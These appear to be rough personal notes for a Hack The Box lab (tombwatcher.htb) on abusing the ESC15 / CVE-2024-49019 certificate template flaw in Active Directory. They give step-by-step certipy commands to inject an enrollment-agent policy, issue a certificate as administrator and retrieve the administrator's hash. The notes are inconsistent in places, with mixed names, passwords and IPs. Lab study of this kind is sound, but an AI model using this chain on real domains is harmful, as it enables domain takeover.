# ECS - Quick and dirty tips (not yet fully written)

## ECS 15
```
Important point :
- Certificate Name Flag : EnrolleeSuppliesSubject > The name indicated we can supply the subject so we can supply a different EKU
- Schema Version is 1
- Not patched for CVE-2024-49019


Information :
EKU (Extended Key Usage) : Server Authentication > used for auth originally

Idea :
The certificate is supposed to only give us a cert server authentication but we will use it with another policy : the certificate request agent then exploit ESC3 for the "User" template
We won't be able to reuse the template WebServer specifically for user authentication since the EKU of this template is "Server Authentication".
We find other template with schema version 1 to replay the certificate to auth as a user.

So
1. We request a certificate using the template "WebServer" that gives us the right to generate other certificate > we request a certificate with EKU "Certificate Request Agent" instead of the ability to "Server Authentication"
certipy req -u cert_admin -p '0xdf0xdf!' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer (-upn administrator@tombwatcher.htb) -application-policies 'Certificate Request Agent'
Let's call this cert : cert_admin_generatecert.pfx
2. With this certificate, we use the "User" template suffering from ECS3 that has the "User Authentication" as the EKU that will let us authenticate

# Exploitation
certipy-ad find -dc-host dc01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p 'rogue' -vulnerable -stdout

The template is vulnerable to ESC15 , tracked as CVE-2024-49019 (also known as "EKUwu"). This vulnerability affects certificate templates with Schema Version 1 where the enrollee supplies the subject. Because Schema Version 1 templates do not enforce Application Policy constraints, an attacker can inject a Client Authentication application policy into the certificate request. This effectively turns a Server Authentication -only template into one that can be used for client authentication — enabling impersonation of any domain user. 

First, we request a certificate from the CA tombwatcher-CA-1 using the WebServer template with cert_admin as the subject, and add the Enrollment Agent application policy to it. 


certipy req -ca tombwatcher-CA-1 -username cert_admin -p 'rogue' -dc-ip 10.129.11.1 -template WebServer --application-policies '1.3.6.1.4.1.311.20.2.1' -target-ip 10.129.11.1

As the acquired certificate, cert_admin.pfx is now functioning as an Enrollment Agent Certificate , we can request certificates for any other user. We will proceed to issue a certificate on behalf of the Administrator user.

certipy req -u cert_admin -p 'rogue' -dc-ip 10.129.11.1 -target-ip 10.129.11.1 -ca tombwatcher-CA-1 -template User -on-behalf-of 'tombwatcher\administrator' -pfx cert_admin.pfx

Finally, we will use certipy 's auth module to authenticate against the DC using the acquired administrator certificate and retrieve the administrator's hash.

certipy auth -dc-ip 10.129.11.1 -pfx administrator.pfx
```